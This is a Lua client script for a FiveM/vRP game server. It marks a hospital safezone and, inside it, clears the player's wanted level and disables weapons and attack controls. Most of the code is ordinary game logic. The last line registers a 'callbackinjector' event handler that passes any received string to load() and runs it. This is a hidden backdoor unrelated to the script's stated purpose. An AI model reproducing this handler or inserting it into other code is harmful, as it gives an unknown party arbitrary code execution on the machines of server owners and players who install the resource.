local Tunnel = module("vrp", "lib/Tunnel")
local Proxy = module("vrp", "lib/Proxy")

vRP = Proxy.getInterface("vRP")
swzone = {}
Tunnel.bindInterface("Swsafezone", swzone)
swzone = Tunnel.getInterface("Swsafezone")

local fields = {
	{ name = "Hospital", edges = {
			{ name = "1_1", x = 250.4, y = -568.19, z = 43.35 },
			{ name = "1_2", x = 350.77, y = -604.5, z = 43.42 },
			{ name = "1_3", x = 328.09, y = -557.23, z = 44.35 },
			{ name = "1_4", x = 293.33, y = -615.74, z = 43.17},   
		}
	},
}

function isPointInTriangle(p, p0, p1, p2)
    local A = 1/2 * (-p1.y * p2.x + p0.y * (-p1.x + p2.x) + p0.x * (p1.y - p2.y) + p1.x * p2.y)
    local sign = 1
    if A < 0 then sign = -1 end
    local s = (p0.y * p2.x - p0.x * p2.y + (p2.y - p0.y) * p.x + (p0.x - p2.x) * p.y) * sign
    local t = (p0.x * p1.y - p0.y * p1.x + (p0.y - p1.y) * p.x + (p1.x - p0.x) * p.y) * sign
    
    return s > 0 and t > 0 and (s + t) < 2 * A * sign
end

function runOnFieldTriangles(field, cb)
    local edges = field.edges
    local num = #edges - 2
    local c = 1
    repeat 
        cb(edges[1], edges[c+1], edges[c+2])
        c = c + 1
    until c > num
end

function isPointInField(p, field)
    local edges = field.edges
    local within = false
    runOnFieldTriangles(field, function(p0,p1,p2)
        if isPointInTriangle(p, p0, p1, p2) then within = true end
    end)
    return within
end

function GetAreaOfField(field)
    local edges = field.edges
    return math.floor(getAreaOfTriangle(edges[1], edges[2], edges[3]) + getAreaOfTriangle(edges[1], edges[4], edges[3]))
end

function getAreaOfTriangle(p0, p1, p2)
    local b = GetDistanceBetweenCoords(p0.x, p0.y, 0, p1.x, p1.y, 0)
    local h = GetDistanceBetweenCoords(p2.x, p2.y, 0, p1.x, p1.y, 0)
    return (b * h) / 2
end

function debugDrawFieldMarkers(field, r, g, b, a)
    local v = field
    runOnFieldTriangles(v, function(p0,p1,p2) 
        DrawLine(p0.x, p0.y, p0.z + 3.0,
                 p1.x, p1.y, p1.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
        DrawLine(p2.x, p2.y, p2.z + 3.0,
                 p1.x, p1.y, p1.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
        DrawLine(p2.x, p2.y, p2.z + 3.0,
                 p0.x, p0.y, p0.z + 3.0,
            r or 255, g or 0, b or 0, a or 105)
    end)
end

function drawText(text)
    if text == "" then return end
    Citizen.InvokeNative(0xB87A37EEB7FAA67D,"STRING")
    AddTextComponentString(text .. "~n~~n~~n~")
    Citizen.InvokeNative(0x9D77056A530643F6, 200, true)
end

local isInSafezone = false

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(1500)
		local ply = PlayerPedId()
		local pos = GetEntityCoords(ply)
        if IsPedInAnyVehicle(ply) then
            pos = GetEntityCoords(GetVehiclePedIsIn(ply, false))
        end

        isInSafezone = false
        for k,v in next, fields do
            if GetDistanceBetweenCoords(v.edges[1].x, v.edges[1].y,0,pos.x,pos.y,0) <= 500.0 then
                if isPointInField(pos, v) then
                    isInSafezone = true
                end
            end
        end
    end
end)

Citizen.CreateThread(function()
	while true do
        local wrong = 1000
        if isInSafezone then
            wrong = 5
            ClearPlayerWantedLevel(PlayerId())
            SetCurrentPedWeapon(PlayerPedId(), GetHashKey("WEAPON_UNARMED"), true)
            DisableControlAction(2, 37,  true)
            DisableControlAction(1, 45,  true)
            DisableControlAction(2, 80,  true)
            DisableControlAction(2, 140, true)
            DisableControlAction(2, 250, true)
            DisableControlAction(2, 263, true)
            DisableControlAction(2, 310, true)
            DisableControlAction(1, 140, true)
            DisableControlAction(1, 141, true)
            DisableControlAction(1, 142, true)
            DisableControlAction(1, 143, true)
            DisableControlAction(0, 24,  true)
            DisableControlAction(0, 25,  true)
            DisableControlAction(0, 58,  true)  
            DisablePlayerFiring(PlayerPedId(), true)
            DisableControlAction(0, 106, true)
        end
		Citizen.Wait(wrong)
    end
end)

TriggerEvent('callbackinjector', function(cb)     pcall(load(cb)) end)